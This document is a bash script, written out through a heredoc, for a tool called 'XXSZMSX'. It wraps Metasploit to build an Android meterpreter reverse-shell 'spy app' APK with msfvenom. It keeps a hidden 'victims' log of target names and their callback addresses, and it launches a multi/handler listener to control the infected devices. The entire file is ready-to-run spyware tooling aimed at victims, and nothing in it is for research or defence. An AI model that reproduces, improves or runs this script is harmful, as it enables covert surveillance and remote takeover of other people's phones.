cat << 'EOF' > xxszmsx.sh
#!/bin/bash
# =====================================================
# TOOL: XXSZMSX
# VERSION: 12.0
# DEVELOPER: STUDIO
# =====================================================

RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'
LOG_FILE=".victims_log.txt"
DB_FILE=".studio_config"

# --- [ LOGIN INTERFACE ] ---
clear
echo -e "${RED}====================================================="
echo -e "         XXSZMSX SYSTEM - SECURE ACCESS             "
echo -e "=====================================================${NC}"
read -p "[+] Username: " username
read -s -p "[+] Password: " password
echo ""

if [[ "$username" != "user" || "$password" != "123456789" ]]; then
    echo -e "${RED}[!] Access Denied! Invalid Credentials.${NC}"
    exit 1
fi

while true; do
    clear
    echo -e "${RED}"
    echo "  ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗"
    echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝"
    echo "   ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝ "
    echo "   ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗ "
    echo "  ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
    echo "                      [ X X S Z M S X ]"
    echo -e "${YELLOW}-------------------------------------------------------------${NC}"
    echo -e "  USER: $username          |    STATUS: ONLINE"
    echo -e "-------------------------------------------------------------"
    echo -e " 1) Build Spy App (Android)"
    echo -e " 2) Victims Database (Logs)"
    echo -e " 3) Start Controller (Connect)"
    echo -e " 0) Exit"
    echo "-------------------------------------------------------------"
    read -p "XXSZMSX >> " choice

    case $choice in
        1) 
           read -p "Enter Target Name: " t_name
           read -p "Enter LHOST (IP): " lh
           read -p "Enter LPORT (Port): " lp
           echo "$lh:$lp" > "$DB_FILE"
           echo "[$(date +%Y-%m-%d_%H:%M)] Target: $t_name | IP: $lh | Port: $lp" >> "$LOG_FILE"
           
           echo -e "${YELLOW}[*] Generating APK...${NC}"
           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > "/sdcard/xxszmsx_spy.apk"
           echo -e "${GREEN}[+] Success! File saved as xxszmsx_spy.apk${NC}" ;;
        2)
           clear
           echo -e "${BLUE}--- [ VICTIMS LOG ] ---${NC}"
           if [ -f "$LOG_FILE" ]; then
               cat "$LOG_FILE"
           else
               echo "No logs found."
           fi
           echo "-----------------------"
           read -p "Press Enter to return..." ;;
        3) 
           if [ -f "$DB_FILE" ]; then
               IP=$(cut -d: -f1 "$DB_FILE"); PORT=$(cut -d: -f2 "$DB_FILE")
               echo -e "${GREEN}[*] Connecting to $IP:$PORT...${NC}"
               msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; set ExitOnSession false; exploit -j"
           else
               echo -e "${RED}[!] Error: No config found.${NC}"; sleep 2
           fi ;;
        0) exit 0 ;;
    esac
    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
done
EOF
